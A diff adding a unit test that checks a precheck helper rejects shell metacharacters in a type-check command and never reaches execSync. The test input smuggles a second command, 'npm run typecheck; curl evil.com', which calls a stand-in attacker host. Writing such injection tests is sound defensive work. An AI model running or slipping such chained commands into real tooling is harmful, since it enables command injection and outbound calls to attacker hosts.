@@ -176,4 +176,34 @@ describe("post-precheck helpers", () => {
     assert.equal(outcome.shouldSkip, true);
     assert.equal(outcome.result.counts_as_completed, true);
   });
+
+  test("inspectPostPrecheckSkip rejects shell metacharacters in typeCheckCommand", () => {
+    const readers = createFileReaders({
+      "/repo/src/a.ts": "export const fixed = true;\n",
+    });
+    // execSync that records if called — it MUST NOT be reached when
+    // typeCheckCommand contains shell metacharacters (P12.I1 bypass guard).
+    let execSyncCalled = false;
+    const outcome = inspectPostPrecheckSkip({
+      task: {
+        id: "FIX-5",
+        scope: { targets: [{ file: "src/a.ts" }] },
+        post_conditions: [
+          { type: "code_contains", params: { file: "src/a.ts", text: "fixed = true" } },
+        ],
+      },
+      rootDir: ROOT,
+      typeCheckCommand: "npm run typecheck; curl evil.com",
+      execSync: () => {
+        execSyncCalled = true;
+        return "";
+      },
+      ...readers,
+    });
+
+    assert.equal(execSyncCalled, false, "execSync must not be called with shell metacharacters");
+    assert.equal(outcome.shouldSkip, false);
+    assert.equal(outcome.reason, "invalid_command");
+    assert.match(outcome.logMessage, /不合法内容/);
+  });
 });
